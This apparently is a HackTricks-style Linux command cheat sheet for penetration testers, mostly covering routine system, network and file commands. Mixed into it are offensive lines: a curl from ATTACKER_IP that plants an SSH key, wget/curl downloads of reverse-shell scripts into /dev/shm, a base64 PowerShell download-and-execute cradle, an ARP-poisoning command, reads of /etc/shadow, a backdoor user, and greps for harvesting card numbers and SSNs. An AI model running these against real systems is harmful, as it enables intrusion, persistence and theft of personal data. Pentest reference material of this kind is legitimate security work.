# Useful Linux Commands

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## useful commands 
```bash
# Current user info
id
echo $PATH  # Path

# System Info:
cat /etc/os-release
uname -a         # Show system info + kernal version
hostnamectl  # system inforamtion
uptime           # Show system uptime
free -h          # Show memory usage
df -h            # Show disk space

# Network
ifconfig
traceroute -n <ip>
cat /etc/resolv.conf  # DNS server
arp -a  # ARP cache info # list the oprn ports
netstat -tulnp
netstat -auntp  # List the processes & ports
netstat -rn # Show networks accessible 
ss -tulnp # list the open ports
ss -twurp  # List the live processes & ports
lsof  # List the live processes & ports

ip route  # Displays current routing table
netstat -r # Displays current routing table
sudo ip route add <destination_network> via <gateway> dev <interface> # sudo ip route add 192.168.1.0/24 via 192.168.0.1 dev eth0
sudo ip addr add 192.168.1.100/24 dev eth0  # Assigns a static IP
sudo ip route add default via 192.168.1.1  # Sets the default gateway
traceroute 8.8.8.8  # Shows the route taken to reach the destination

sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28 # Captures between the ips
sudo tcpdump -i eth0 -nn -s0 -v  # Captures live packets on eth0
# -i eth0 → Interface to listen on
# -nn → No DNS resolution (faster)
# -s0 → Capture full packet
sudo ettercap -T -M arp -i eth0 /192.168.1.1/ /192.168.1.100/ # ARP Spoofing Attack , -T → Text mode ,-M arp → ARP poisoning attack
sudo bettercap -iface eth0 # Intercept HTTP Traffic, # Inside bettercap, run:
# net.probe on → Scan network
# net.recon on → Discover hosts
# http.proxy on → Intercept HTTP traffic

# Kill the process
lsof -i -P -n #  shows all open network connections.
kill -9 1234 # Kill the process

nmap -sT -p4444-4450 portquiz.net  # Check if we can access the internet


# User info
grep $USER /etc/passwd  # Current user info for /etc/passwd
lastlog  # Most recent log
w  # Who is currently logged into the system
last  # Last logged-on users
for user in $(cat /etc/passwd | cut -f 1 -d ":"); do id $user; done  # All users UID and GID info
cat /etc/passwd | cut -f 1,3,4 -d ":" | grep "0:0" | cut -f 1 -d ":" | awk '{print $1}'
cat /etc/passwd  # /etc/passwd file
cat /etc/shadow  # Passwords
sudo -l  # What we can sudo without a password
cat /etc/sudoers  # Can we read the sudoers file?
cat /root/.bash_history
find /home/* -name *.*history* -print 2> /dev/null
cat /etc/issue
cat /etc*-release  # Operating system


# Cron jobs
cat /etc/crontab && ls -als /etc/cron*
find /etc/cron* -type f -perm -o+w -exec ls -l {} \;

# Running processes
ps auxwww  # List running processes
ps -u root  # List processes running as root
ps -u $USER  # List all processes running as the current user


# File permissions
find / -perm -4000 -type f 2> /dev/null  # Find SUID files
find / -uid 0 -perm -4000 -type f 2> /dev/null  # Find UID owned by root
find / -perm -2000 -type f 2> /dev/null  # Find SGID files
find -perm 2 -type f 2> /dev/null  # Find read-writable files

# chnge the file permissions 
chmod +x <file>
# u-> owner, g->group , others -> o
chmod u=rwx,g=rx,o=r <file>  # Set specific permissions 
chown root /u        Change the owner of /u to "root".
chown root:staff /u  Likewise, but also change its group to "staff".

# Check if a file is immutable
lsattr suid.sh  # If 'i' appears, the file is immutable
# Check if /tmp has the sticky bit set
ls -ld /tmp  # If the last character is 't', only owners can modify their files

# Configuration files
ls -al /etc/*.conf  # List all conf files in /etc
grep pass* /etc/*.conf  # Find conf files that contain the string "pass"
lsof -n  # List open files


# Installed packages (Debian)
dpkg -l  # List installed packages
sudo dpkg -i nessus.deb # install pkg 

systemctl list-units --type=service -all # list all active services
systemctl list-unit-files | grep -i nessusd #  list all  services
service --status-all # list all servies 

# Common software versions
sudo -v
httpd -v
apache2 -v
mysql -v
sendmail -d.1


# Process binaries/paths and permissions
ps aux | awk '{print $11}' | xargs -r ls -la 2> /dev/null | awk '!x[$0]++'

## Pentesting Commands
# Service Scanning

nmap 10.129.42.253 # Run Nmap on an IP  
nmap -sV -sC -p- 10.129.42.253 # Run Nmap script scan on an IP  
locate scripts/citrix # List available Nmap scripts  
nmap --script smb-os-discovery.nse -p445 10.10.10.40 # Run specific Nmap script on an IP  
netcat 10.10.10.10 22 # Grab port banner


# SMB Scanning
# the \\ in linux shell => \
smbclient -N -L \\<IP> # List SMB shares  
smbclient -U bob \\\\<IP>\\users # Connect to an SMB share

# SNMP Scanning
onesixtyone -c dict.txt 10.129.42.254 # Brute force SNMP secret string
snmpbulkwalk -c [COMM_STRING] -v [VERSION] [IP] . #Don't forget the final dot
snmpbulkwalk -c public -v2c 10.10.11.136 .
snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] .1 #Enum all

xfreerdp /u:<username> /p:<password> /v:<IP> # connect to RDP 
```
## Common Bash

```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e


#Count
wc -l <file> #Lines
wc -c #Chars

# compare files line by line
diff <file1>  <file2>

hasher <file> # check MD5 message digest

#Sort
sort -u # removes any duplicate lines after sorting
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates
cat file | sort | uniq -u # sort and displays the lines that appear once
#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file
sed -r '/^\s*$/d' # **deletes empty lines or lines that contain only whitespace** (spaces, tabs, etc.)
sed -ri '/^.{,9}$/d' mut_password.list # Remove all passwords shorter than 10 with sed -ri '/^.{,9}$/d' mut_password.list

echo "mido ahmed rawen 2002" | awk '{print $1}'  # mido
echo "hate rawen : love rawen" | cut -f 2 -d ":" # love rawen
cat file.json | jq . # output the results in JSON format
-------
grep "ahmed" -rwn .  # finds all files in the current directory and subfolders that contain the exact word "ahmed" and shows the matching lines with file paths
-r  Search recursively in all subdirectories  
-w  Match whole words only (not part of another word)
-i Ignore case (don’t use if you want case-sensitive)
-x Match exact full line
-n show the line number 
-------
 # search 

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvf file.tar
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
tar -xvJf file.tar.xz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
gunzip -S .zip <file>.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker  
sudo useradd -u 65534 myuser # create a user with a specific `UID`

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

mount -t nfs 10.129.190.232:/TechSupport mount -o nolock # nfs mount
#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Domain

```bash
realm list # Checking domain access setup
id <user>@<domain> #  Checking what groups a user belongs to
ps -ef | grep -i "winbind\|sssd" # Check If Linux Machine is Domain Joine


```
## Bash for Windows

```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
 
#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853  
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c

# Compile malicious NSS module (shared object)
gcc -O3 -static -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
# -O3        : Max optimization
# -static    : Include all libs inside the file (no external .so needed)
# -shared    : Build a shared object (.so file)
# -nostdlib  : Don’t link standard C libraries (libc, etc.)
# -o         : Output file
# shellcode.c: Source file with payload or custom _start

# Compile the main exploit binary
gcc -O3 -static -o exploit exploit.c
# -O3        : Max optimization
# -static    : Statically link everything (no external dependencies)
# -o         : Output file
# exploit.c  : Source file for exploit logic
# -m32       : Compile for 32-bit
# -m64       : Compile for 64-bit
```

## Greps

```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```

## Find

```bash
find [path] [options] [expression]
find /path/to/search -name "file.txt"
find /path/to/search -iname "file.txt" # Case-insensitive search.
find /path/to/search -type f -name "*.txt" # Finds all `.txt` files

find /path/to/search -type f -size 100k # Finds files that are 100 KB
# Size units in find:
# c - Bytes, k - KB (1024 bytes), M - MB (1024 KB), G - GB (1024 MB)
find /path/to/search -size +50M # Finds files larger than **50MB**
find /path/to/search -size -100k # # Finds files smaller than **100KB**.

find /path/to/search -mtime -7 # Finds files modified within the last 7 days
find /path/to/search -atime +30 # Finds files accessed more than 30 days ago

find /path -type f ! -perm /[Symb Perms]=x[user]
Symb Perms:
u -> User (Owner)
g -> Group
o -> Others
a -> All (user + group + others)

r -> Read
w -> Write
x -> Execute

Example:
find /path -type f ! -perm /a=x
#/a=x -> Any user must have execute (x)
#! -perm -> Files without execute permission
find /path -type f -perm /a=rw ! -perm /a=x # Find files that are only readable and writable (no execute)
find /path/to/search -perm 777 # Finds files with full permissions (rwxrwxrwx)

find /path/to/search -type f -user username # find file by user owner 
find /path/to/search -type f -group groupname # find file by group owner

# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```

## Nmap search help

```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```

## Bash

```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```

## Iptables

```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
